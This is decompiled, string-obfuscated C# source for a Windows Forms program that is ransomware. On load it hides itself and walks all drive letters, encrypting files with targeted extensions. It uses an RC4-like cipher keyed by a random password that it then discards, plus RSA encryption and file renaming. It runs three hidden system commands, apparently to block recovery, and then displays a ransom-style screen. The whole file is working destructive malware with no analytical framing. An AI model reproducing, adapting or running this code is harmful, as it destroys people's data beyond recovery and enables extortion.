using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using ns1;

namespace ns0;

public class GForm0 : Form
{
	public enum KeySizes
	{
		SIZE_512 = 512,
		SIZE_1024 = 1024,
		SIZE_2048 = 2048,
		SIZE_952 = 952,
		SIZE_1369 = 1369
	}

	private static string string_0;

	private static string string_1;

	internal const int int_0 = 61536;

	internal const int int_1 = 0;

	internal const int int_2 = 1;

	internal const int int_3 = 2;

	internal const int int_4 = 61472;

	internal const int int_5 = 61488;

	private const int int_6 = 512;

	private IContainer icontainer_0 = null;

	private PictureBox pictureBox_0;

	private Button button_0;

	private Label label_0;

	private RichTextBox richTextBox_0;

	private Label label_1;

	private Label label_2;

	private Label label_3;

	private Label label_4;

	private Label label_5;

	private Label label_6;

	private Label label_7;

	private Label label_8;

	private Label label_9;

	private Label label_10;

	private Button button_1;

	private Label label_11;

	private Label label_12;

	private Label label_13;

	private PictureBox pictureBox_1;

	private Panel panel_0;

	private TextBox textBox_0;

	private Button button_2;

	private Button button_3;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ClassStyle(createParams.get_ClassStyle() | 0x200);
			return createParams;
		}
	}

	public GForm0()
	{
		method_11();
	}

	[DllImport("user32.dll")]
	private static extern IntPtr GetSystemMenu(IntPtr intptr_0, bool bool_0);

	[DllImport("user32.dll")]
	private static extern int EnableMenuItem(IntPtr intptr_0, int int_7, int int_8);

	public static byte[] smethod_0(byte[] byte_0, byte[] byte_1)
	{
		byte[] array = new byte[byte_0.Length];
		byte[] array2 = new byte[2048];
		byte[] array3 = new byte[2048];
		int i;
		for (i = 0; i < 2048; i++)
		{
			array2[i] = (byte)i;
			array3[i] = byte_1[i % byte_1.GetLength(0)];
		}
		int num = 0;
		for (i = 0; i < 2048; i++)
		{
			num = (num + array2[i] + array3[i]) % 2048;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
		}
		num = 0;
		i = 0;
		for (int j = 0; j < array.GetLength(0); j++)
		{
			i = (i + 1) % 2048;
			num = (num + array2[i]) % 2048;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
			int num2 = (array2[i] + array2[num]) % 2048;
			array[j] = (byte)(byte_0[j] ^ array2[num2]);
		}
		return array;
	}

	public string method_0(int int_7)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < int_7--)
		{
			stringBuilder.Append(smethod_4("$ĦȠ\u0326ФԦ\u0658ݖࡔ\u0956\u0a50\u0b56\u0c54ൖ๘ཆ၄ᅆቀፆᑄᕆᙘ\u1756ᡔᥖ\u1a6a᭨ᱪᵬṢὠ\u2062Ⅼ≪⍨⑪╬♒❐⡒⥌⩊⭈ⱊⵌ⹂⽀あㅌ㉊㍈㐠㔢㘼㜺㠸㤺㨼㬲㰰㴸㸭㼧䀸䄢䈼䌤䐮")[random.Next(smethod_4("$ĦȠ\u0326ФԦ\u0658ݖࡔ\u0956\u0a50\u0b56\u0c54ൖ๘ཆ၄ᅆቀፆᑄᕆᙘ\u1756ᡔᥖ\u1a6a᭨ᱪᵬṢὠ\u2062Ⅼ≪⍨⑪╬♒❐⡒⥌⩊⭈ⱊⵌ⹂⽀あㅌ㉊㍈㐠㔢㘼㜺㠸㤺㨼㬲㰰㴸㸭㼧䀸䄢䈼䌤䐮").Length)]);
		}
		return stringBuilder.ToString();
	}

	public string method_1(int int_7)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < int_7--)
		{
			stringBuilder.Append(smethod_4("ešɡ\u0365ѥՙ\u0659ݕࡕ\u0951\u0a51\u0b55\u0c55൙๙ཅ၅ᅁቁፅᑅᕙᙙ\u1755ᡕᥑᨻ\u1b3b᰻ᴳḳἳ″℻∻⌱")[random.Next(smethod_4("ešɡ\u0365ѥՙ\u0659ݕࡕ\u0951\u0a51\u0b55\u0c55൙๙ཅ၅ᅁቁፅᑅᕙᙙ\u1755ᡕᥑᨻ\u1b3b᰻ᴳḳἳ″℻∻⌱").Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void smethod_1(string string_2, string string_3)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		rSACryptoServiceProvider.PersistKeyInCsp = false;
		if (File.Exists(string_3))
		{
			File.Delete(string_3);
		}
		if (File.Exists(string_2))
		{
			File.Delete(string_2);
		}
		string text = (string_0 = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: false));
		string text2 = (string_1 = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: true));
	}

	private static byte[] smethod_2(string string_2, byte[] byte_0)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		rSACryptoServiceProvider.PersistKeyInCsp = false;
		string xmlString = string_0;
		rSACryptoServiceProvider.FromXmlString(xmlString);
		return rSACryptoServiceProvider.Encrypt(byte_0, fOAEP: true);
	}

	public void method_2(string string_2, string string_3)
	{
		try
		{
			string[] source = new string[43]
			{
				smethod_4("*ŷɺ\u0375"),
				smethod_4("*ŧɭ\u0362"),
				smethod_4("+Šɬ\u0361ѹ"),
				smethod_4("*ŻɮͲ"),
				smethod_4("(Ŭɪ\u0367ѧչ"),
				smethod_4("*ųɦ\u0367"),
				smethod_4("*Źɫͱ"),
				smethod_4("*űɣͳ"),
				smethod_4("*ŠɱͲ"),
				smethod_4("*ůɬ\u036a"),
				smethod_4("+żɯͱѹ"),
				smethod_4("*ųɲ\u0375"),
				smethod_4("+ŴɳͶѹ"),
				smethod_4("*Ŭɦ\u0375"),
				smethod_4("*ũɲ\u0366"),
				smethod_4("*šɯͱ"),
				smethod_4("*ųɬ\u0366"),
				smethod_4("*Šɱͷ"),
				smethod_4("*Űɳ\u036d"),
				smethod_4("*Ůɦ\u0363"),
				smethod_4("*Űɮ\u036f"),
				smethod_4("*ųɪͱ"),
				smethod_4("*Ţɱͱ"),
				smethod_4("+ťɰͲѹ"),
				smethod_4("+Ŭɷ\u036fѭ"),
				smethod_4("*ūɶ\u036c"),
				smethod_4("-ůɭ"),
				smethod_4("*Żɯ\u036d"),
				smethod_4("*ųɱ\u0365"),
				smethod_4("-Šɪ"),
				smethod_4("*šɣ\u0375"),
				smethod_4("*Ůɲ\u0332"),
				smethod_4("*Ůɲ\u0335"),
				smethod_4("*Ŵɣͷ"),
				smethod_4("*Ŵɯ\u0360"),
				smethod_4("*Ţɴ\u0368"),
				smethod_4("+Šɪʹѹ"),
				smethod_4("*Ůɩͷ"),
				smethod_4("+ũɳ\u0367Ѧ"),
				smethod_4("*Ŵɯͷ"),
				smethod_4("*Ůɭͷ"),
				smethod_4("*Ŭɥ\u0366"),
				smethod_4("*űɶ\u0367")
			};
			string[] files = Directory.GetFiles(string_2);
			string[] directories = Directory.GetDirectories(string_2);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					method_3(files[i], string_3);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				method_2(directories[j], string_3);
			}
		}
		catch (Exception)
		{
		}
	}

	public void method_3(string string_2, string string_3)
	{
		byte[] byte_ = File.ReadAllBytes(string_2);
		byte[] bytes = Encoding.UTF8.GetBytes(string_3);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = smethod_0(byte_, bytes);
		File.WriteAllBytes(string_2, bytes2);
		File.Move(string_2, string_2);
	}

	public void method_4(string string_2)
	{
		byte[] array = File.ReadAllBytes(string_2);
		byte[] bytes = smethod_2(string_0, Encoding.UTF8.GetBytes(array.ToString()));
		File.WriteAllBytes(string_2, bytes);
		File.Move(string_2, string_2 + smethod_4("%ŨɬͼѦմ٤ݷࡪॶ\u0a64"));
	}

	public void method_5(string string_2)
	{
		try
		{
			string[] source = new string[41]
			{
				smethod_4("*ŷɺ\u0375"),
				smethod_4("*ŧɭ\u0362"),
				smethod_4("+Šɬ\u0361ѹ"),
				smethod_4("*ŻɮͲ"),
				smethod_4("(Ŭɪ\u0367ѧչ"),
				smethod_4("*ųɦ\u0367"),
				smethod_4("*Źɫͱ"),
				smethod_4("*űɣͳ"),
				smethod_4("*ŠɱͲ"),
				smethod_4("*ůɬ\u036a"),
				smethod_4("+żɯͱѹ"),
				smethod_4("*ųɲ\u0375"),
				smethod_4("+ŴɳͶѹ"),
				smethod_4("*Ŭɦ\u0375"),
				smethod_4("*ũɲ\u0366"),
				smethod_4("*šɯͱ"),
				smethod_4("*ųɬ\u0366"),
				smethod_4("*Šɱͷ"),
				smethod_4("*Űɳ\u036d"),
				smethod_4("*Ůɦ\u0363"),
				smethod_4("*Űɮ\u036f"),
				smethod_4("*ųɪͱ"),
				smethod_4("*Ţɱͱ"),
				smethod_4("+ťɰͲѹ"),
				smethod_4("+Ŭɷ\u036fѭ"),
				smethod_4("*Żɯ\u036d"),
				smethod_4("*ųɱ\u0365"),
				smethod_4("-Šɪ"),
				smethod_4("*šɣ\u0375"),
				smethod_4("*Ůɲ\u0332"),
				smethod_4("*Ůɲ\u0335"),
				smethod_4("*Ŵɣͷ"),
				smethod_4("*Ŵɯ\u0360"),
				smethod_4("*Ţɴ\u0368"),
				smethod_4("+Šɪʹѹ"),
				smethod_4("*Ůɩͷ"),
				smethod_4("+ũɳ\u0367Ѧ"),
				smethod_4("*Ŵɯͷ"),
				smethod_4("*Ůɭͷ"),
				smethod_4("*Ŭɥ\u0366"),
				smethod_4("*űɶ\u0367")
			};
			string[] files = Directory.GetFiles(string_2);
			string[] directories = Directory.GetDirectories(string_2);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					method_4(files[i]);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				method_5(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	private void method_6()
	{
		smethod_1(string_0, string_1);
		method_5(smethod_4("@ĸɝ"));
		method_5(smethod_4("Bĸɝ"));
		method_5(smethod_4("Aĸɝ"));
		method_5(smethod_4("@ĸɝ"));
		method_5(smethod_4("Gĸɝ"));
		method_5(smethod_4("Fĸɝ"));
		method_5(smethod_4("Eĸɝ"));
		method_5(smethod_4("Dĸɝ"));
		method_5(smethod_4("Kĸɝ"));
		method_5(smethod_4("Jĸɝ"));
		method_5(smethod_4("Iĸɝ"));
		method_5(smethod_4("Hĸɝ"));
		method_5(smethod_4("Oĸɝ"));
		method_5(smethod_4("Nĸɝ"));
		method_5(smethod_4("Mĸɝ"));
		method_5(smethod_4("Lĸɝ"));
		method_5(smethod_4("Sĸɝ"));
		method_5(smethod_4("Rĸɝ"));
		method_5(smethod_4("Qĸɝ"));
		method_5(smethod_4("Pĸɝ"));
		method_5(smethod_4("Wĸɝ"));
		method_5(smethod_4("Vĸɝ"));
		method_5(smethod_4("Uĸɝ"));
		method_5(smethod_4("Tĸɝ"));
		method_5(smethod_4("[ĸɝ"));
		method_5(smethod_4("Zĸɝ"));
		method_5(smethod_4("Yĸɝ"));
		string_0 = null;
		string_1 = null;
		string string_ = method_0(256);
		method_2(smethod_4("@ĸɝ"), string_);
		method_2(smethod_4("Bĸɝ"), string_);
		method_2(smethod_4("Aĸɝ"), string_);
		method_2(smethod_4("@ĸɝ"), string_);
		method_2(smethod_4("Gĸɝ"), string_);
		method_2(smethod_4("Fĸɝ"), string_);
		method_2(smethod_4("Eĸɝ"), string_);
		method_2(smethod_4("Dĸɝ"), string_);
		method_2(smethod_4("Kĸɝ"), string_);
		method_2(smethod_4("Jĸɝ"), string_);
		method_2(smethod_4("Iĸɝ"), string_);
		method_2(smethod_4("Hĸɝ"), string_);
		method_2(smethod_4("Oĸɝ"), string_);
		method_2(smethod_4("Nĸɝ"), string_);
		method_2(smethod_4("Mĸɝ"), string_);
		method_2(smethod_4("Lĸɝ"), string_);
		method_2(smethod_4("Sĸɝ"), string_);
		method_2(smethod_4("Rĸɝ"), string_);
		method_2(smethod_4("Qĸɝ"), string_);
		method_2(smethod_4("Pĸɝ"), string_);
		method_2(smethod_4("Wĸɝ"), string_);
		method_2(smethod_4("Vĸɝ"), string_);
		method_2(smethod_4("Uĸɝ"), string_);
		method_2(smethod_4("Tĸɝ"), string_);
		method_2(smethod_4("[ĸɝ"), string_);
		method_2(smethod_4("Zĸɝ"), string_);
		method_2(smethod_4("Yĸɝ"), string_);
		string_ = null;
	}

	public static void smethod_3()
	{
		Process currentProcess = Process.GetCurrentProcess();
		try
		{
			currentProcess.MinWorkingSet = (IntPtr)300000;
		}
		catch (Exception)
		{
			throw new Exception();
		}
	}

	public void method_7()
	{
		method_8();
		Thread.Sleep(1200);
	}

	public void method_8()
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = smethod_4("dūɡ\u032aѦպ٤");
			processStartInfo.Arguments = smethod_4("\u0005ŪȈ\u0351ѕՖم\u0747ࡏ\u0948\u0a4e\u0b31౻\u0d65\u0e79༻ၾᅼቴ፲ᑢᕰᘴᝠ\u187aᥰ\u1a74᭠ᱹᵾḬἤ\u206bⅥ≤⌧\u2429╴♱❪⡧⥵");
			process.StartInfo = processStartInfo;
			process.Start();
			Process process2 = new Process();
			ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
			processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo2.FileName = smethod_4("dūɡ\u032aѦպ٤");
			processStartInfo2.Arguments = smethod_4("6śȷ\u0361Ѹս\u0670\u0732ࡢॸ੮୪\u0c62ൻ\u0e68ཥၹᅱሧ።ᑠᕨᙦ\u1776ᡤ");
			process2.StartInfo = processStartInfo2;
			process2.Start();
			Process process3 = new Process();
			ProcessStartInfo processStartInfo3 = new ProcessStartInfo();
			processStartInfo3.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo3.FileName = smethod_4("dūɡ\u032aѦպ٤");
			processStartInfo3.Arguments = smethod_4("\u000fŜȾ\u036aѾպپݴ\u0871ॹਸ਼ୱ\u0c71ൿ\u0e77ཥၵᄯቭ፬ᑸᕪᙦᝦᡯ\u1927ᨫ᭴ᱱᵪṧή");
			process3.StartInfo = processStartInfo3;
			process3.Start();
		}
		catch (Exception)
		{
		}
	}

	private void method_9()
	{
		string text = method_1(50);
		string text2 = method_1(30);
		string text3 = method_1(30);
		string text4 = method_1(30);
		string text5 = method_1(30);
		string text6 = method_1(30);
		string text7 = text + Environment.NewLine + text3 + Environment.NewLine + text4 + Environment.NewLine + text2 + Environment.NewLine + text5 + Environment.NewLine + text6;
		((Control)richTextBox_0).set_Text(text7);
	}

	private void method_10()
	{
		method_6();
		smethod_3();
		method_7();
		smethod_3();
		method_9();
		((Control)this).Show();
		((Form)this).set_ShowInTaskbar(true);
		((Form)this).set_Opacity(1.0);
	}

	private void GForm0_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Opacity(0.0);
		method_10();
		((Control)panel_0).Hide();
	}

	private void button_1_Click(object sender, EventArgs e)
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(smethod_4("óǆ\u02dd·Ӆ\u05c4ۊރ\u08d0\u09c4\u0ac7௶೭෩\u0ef9\u0fe9ႺᇸዬᎷᓹᗻᛱឳ\u18fd᧷\u1ab0\u1bfb\u1ce6\u1de8Ậῼ\u20ef⇫⋻⏮⓲◠⚤⟳⣰⧮⫶⬖Ⱊⴘ⸘⽕ばㄠ㈗㌂㑖㔂㘝㜟㠞㥑㨒㬊㱎㴌㸎㼇䀏䅉䈜䌈䑆䔇䘑䜚䡂䤃䨉䬼䰪䴲丵伵倩兹刷匹呶唬嘻圦堠奱娥嬼尫崿幬弻怫愧戭挫摨敏晎末栶椵樰歌氄洒渓潘灕煐牖獕瑗畆癑眝硑神穝笥籆絙繘罛聙脓與茈葊蕊虇蝂衎襃詉譼豪赲蹵轵適鄷鉻鍸鑻锟陼靧顦饡驣鬵鰡鴢鹮齢ꁾꅹꉩꍩꑢꕤꘪꝠꡭꥬ"), smethod_4("Nžɳ\u0329Ѫծ٥ݱ\u086b४੬୲"));
	}

	private void button_3_Click(object sender, EventArgs e)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(smethod_4("VŰɫͽѷճٽݽ࠷ढ़\u0a70୭లലแ\u0f7c\u106aᅯቾ፩ᐫᕞᙻ\u1771ᠧ᥇\u1a62᭥ᱪᵬḯ"));
	}

	private void button_2_Click(object sender, EventArgs e)
	{
		((Control)panel_0).Hide();
	}

	private void button_0_Click(object sender, EventArgs e)
	{
		((Control)panel_0).Show();
	}

	private void GForm0_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(smethod_4("}őɓ\u0348ѓ\u0557\u065fܗࡂढ़\u0a51ଓ\u0c56ൔ๓ཝ\u1057ᅝቘፄᑘᔉᙟᝎᡊ᥉ᨄ\u1b4dᱍᵕḀί⁻ⅱ≬⌻④╶♭✷⡢⥺⨴⭷ⱷ\u2d72\u2e62⽶まㅹ㈬㍲㑥㕼㙺㜧㡠㥬㩨㭦㱱㴯"), smethod_4(""), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void method_11()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_014c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0156: Expected O, but got Unknown
		//IL_0283: Unknown result type (might be due to invalid IL or missing references)
		//IL_028d: Expected O, but got Unknown
		//IL_03b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c1: Expected O, but got Unknown
		//IL_0476: Unknown result type (might be due to invalid IL or missing references)
		//IL_0480: Expected O, but got Unknown
		//IL_0538: Unknown result type (might be due to invalid IL or missing references)
		//IL_0542: Expected O, but got Unknown
		//IL_05fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0604: Expected O, but got Unknown
		//IL_06bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_06c6: Expected O, but got Unknown
		//IL_077e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0788: Expected O, but got Unknown
		//IL_083e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0848: Expected O, but got Unknown
		//IL_0901: Unknown result type (might be due to invalid IL or missing references)
		//IL_090b: Expected O, but got Unknown
		//IL_09c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_09ce: Expected O, but got Unknown
		//IL_0a87: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a91: Expected O, but got Unknown
		//IL_0b2e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b38: Expected O, but got Unknown
		//IL_0c00: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c0a: Expected O, but got Unknown
		//IL_0cc0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cca: Expected O, but got Unknown
		//IL_0d73: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d7d: Expected O, but got Unknown
		//IL_0f19: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f23: Expected O, but got Unknown
		//IL_0fc9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fd3: Expected O, but got Unknown
		//IL_1251: Unknown result type (might be due to invalid IL or missing references)
		//IL_125b: Expected O, but got Unknown
		//IL_1298: Unknown result type (might be due to invalid IL or missing references)
		//IL_12a2: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(GForm0));
		button_0 = new Button();
		pictureBox_0 = new PictureBox();
		label_0 = new Label();
		richTextBox_0 = new RichTextBox();
		label_1 = new Label();
		label_2 = new Label();
		label_3 = new Label();
		label_4 = new Label();
		label_5 = new Label();
		label_6 = new Label();
		label_7 = new Label();
		label_8 = new Label();
		label_9 = new Label();
		label_10 = new Label();
		button_1 = new Button();
		label_11 = new Label();
		label_12 = new Label();
		label_13 = new Label();
		pictureBox_1 = new PictureBox();
		panel_0 = new Panel();
		button_3 = new Button();
		button_2 = new Button();
		textBox_0 = new TextBox();
		((ISupportInitialize)pictureBox_0).BeginInit();
		((ISupportInitialize)pictureBox_1).BeginInit();
		((Control)panel_0).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)button_0).set_Font(new Font(smethod_4("GŚȨ\u0357сժ\u0670ݫ\u086b\u0962"), 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((ButtonBase)button_0).set_ImageKey(smethod_4("/ŧɰ\u0367Ѷլب"));
		((Control)button_0).set_Location(new Point(422, 658));
		((Control)button_0).set_Name(smethod_4("eųɱͰѬլذ"));
		((Control)button_0).set_Size(new Size(86, 31));
		((Control)button_0).set_TabIndex(1);
		((Control)button_0).set_Text(smethod_4("CŃɆ\u0356њՒ\u0655"));
		((Control)button_0).add_Click((EventHandler)button_0_Click);
		pictureBox_0.set_Image((Image)(object)Class1.Bitmap_0);
		((Control)pictureBox_0).set_Location(new Point(0, 0));
		((Control)pictureBox_0).set_Name(smethod_4("{ţɪͼѲմ٠\u0746\u086cॺਰ"));
		((Control)pictureBox_0).set_Size(new Size(932, 710));
		pictureBox_0.set_TabIndex(0);
		pictureBox_0.set_TabStop(false);
		((Control)label_0).set_AutoSize(true);
		((Control)label_0).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)label_0).set_Font(new Font(smethod_4("_Ÿɳͽѡվ٣ݭ\u087eऩ\u0a51୦\u0c4eൠ\u0e6d༣\u1057ᅈ"), 18f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_0).set_ForeColor(Color.White);
		((Control)label_0).set_Location(new Point(295, 134));
		((Control)label_0).set_Name(smethod_4("jŤɦ\u0366Ѯ\u0530"));
		((Control)label_0).set_Size(new Size(340, 31));
		((Control)label_0).set_TabIndex(2);
		((Control)label_0).set_Text(smethod_4("]ŷɶ\u0339ѡո٣ݧ࠴ॵ\u0a7b\u0b7d\u0c75ർฮཬၾᅮሪ፬ᑦᕤᙴ\u177cᡴ\u1977\u1a67᭥"));
		((Control)richTextBox_0).set_Location(new Point(252, 465));
		((Control)richTextBox_0).set_Name(smethod_4("~Ţɩ\u0361ќբپݱࡆ६\u0a7aର"));
		((TextBoxBase)richTextBox_0).set_ReadOnly(true);
		richTextBox_0.set_ScrollBars((RichTextBoxScrollBars)2);
		((Control)richTextBox_0).set_Size(new Size(427, 115));
		((Control)richTextBox_0).set_TabIndex(3);
		((Control)richTextBox_0).set_Text(smethod_4(""));
		((Control)label_1).set_AutoSize(true);
		((Control)label_1).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)label_1).set_Font(new Font(smethod_4("GŚȨ\u0357сժ\u0670ݫ\u086b\u0962"), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_1).set_ForeColor(Color.White);
		((Control)label_1).set_Location(new Point(84, 210));
		((Control)label_1).set_Name(smethod_4("jŤɦ\u0366ѮԳ"));
		((Control)label_1).set_Size(new Size(762, 16));
		((Control)label_1).set_TabIndex(4);
		((Control)label_1).set_Text(smethod_4("\aĲȩ\u0329ѺԽط\u0734\u0823स\u0a31ଽదഢ\u0e7c\u0f6f\u103eᄥሣጿᐥᔺᙤᝧᠢ\u1924ᨰᬢᰠᴠḳ\u1f5a⁍ℝ≝⍕\u245e┙♗❃⡞⥐⩆⬓ⱔⵘ\u2e5c⽊そㄍ㉄㍊㑜㕌㘈㝅㡃㥀㩊㬃㱇㵏㹃㽭䁧䅭䉨䍾䑾䔹䙭䝤䡿䥻䩳䬳䱀䵒两伯偯兣剨匫员啚噉圪場夵娰嬻小崋"));
		label_1.set_TextAlign((ContentAlignment)32);
		((Control)label_2).set_AutoSize(true);
		((Control)label_2).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)label_2).set_Font(new Font(smethod_4("GŚȨ\u0357сժ\u0670ݫ\u086b\u0962"), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_2).set_ForeColor(Color.White);
		((Control)label_2).set_Location(new Point(182, 226));
		((Control)label_2).set_Name(smethod_4("jŤɦ\u0366ѮԲ"));
		((Control)label_2).set_Size(new Size(567, 16));
		((Control)label_2).set_TabIndex(5);
		((Control)label_2).set_Text(smethod_4("\u0005Ŀɪ\u0324ЭԦب\u0736ࡤषਪଠఴട๗ཉ၏ᄛቓፔᑈᕘᙅᝆᡝᥑ\u1a5e᭔ᰐᵛṁἍ⁞ⅎ≉⍆\u245e╂♔✅⡝⥌⩁⭓ⱙⵯ\u2e6a⽸へㄻ㉼㍰㑴㕲㙥㜵㡣㥺㩦㭹㱿㵺㹺㼭䁣䅾䉸䌩䑠䕢䙪䝵䠪䤣䨏䬋"));
		label_2.set_TextAlign((ContentAlignment)32);
		((Control)label_3).set_AutoSize(true);
		((Control)label_3).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)label_3).set_Font(new Font(smethod_4("GŚȨ\u0357сժ\u0670ݫ\u086b\u0962"), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_3).set_ForeColor(Color.White);
		((Control)label_3).set_Location(new Point(227, 262));
		((Control)label_3).set_Name(smethod_4("jŤɦ\u0366ѮԵ"));
		((Control)label_3).set_Size(new Size(477, 16));
		((Control)label_3).set_TabIndex(6);
		((Control)label_3).set_Text(smethod_4("\třȞ\u0344ѓՎ\u061aݎ\u0859ख़\u0a42କ\u0c40൜ฒཕၕᅌቜፔᑜᕟᘊᝐᡇᥒᩔᬅ᱂ᵊṎὄ⁓ℳ∾⍭⑰╾♻❪⡽⤷⩵⭺ⱺⵧ\u2e73⽲つㄯ㉻㍾㐬㕩㙳㜩㡭㥪㩧㭬㱨㴭㸏㼋"));
		label_3.set_TextAlign((ContentAlignment)32);
		((Control)label_4).set_AutoSize(true);
		((Control)label_4).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)label_4).set_Font(new Font(smethod_4("GŚȨ\u0357сժ\u0670ݫ\u086b\u0962"), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_4).set_ForeColor(Color.White);
		((Control)label_4).set_Location(new Point(201, 278));
		((Control)label_4).set_Name(smethod_4("jŤɦ\u0366ѮԴ"));
		((Control)label_4).set_Size(new Size(529, 16));
		((Control)label_4).set_TabIndex(7);
		((Control)label_4).set_Text(smethod_4("\u001dĬȷ\u0361ЭՊ\u064d\u0749\u081c\u094b\u0a48\u0b56\u0c4e൞๒ཐနᅊቝፄᑂᔏᙞᝈᡞᥘᩅᭇ᱆ᵆṊἅ\u206dⅧ∂⍈\u244e┿♪❵⡹⤻⩩⭬ⱺ\u2d7d\u2e73⽶だㄳ㉽㍷㐰㕶㙡㝸㡾㤫㩧㭬㱻㵴㹧㽢䁡䄭䈏䌋"));
		label_4.set_TextAlign((ContentAlignment)32);
		((Control)label_5).set_AutoSize(true);
		((Control)label_5).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)label_5).set_Font(new Font(smethod_4("GŚȨ\u0357сժ\u0670ݫ\u086b\u0962"), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_5).set_ForeColor(Color.White);
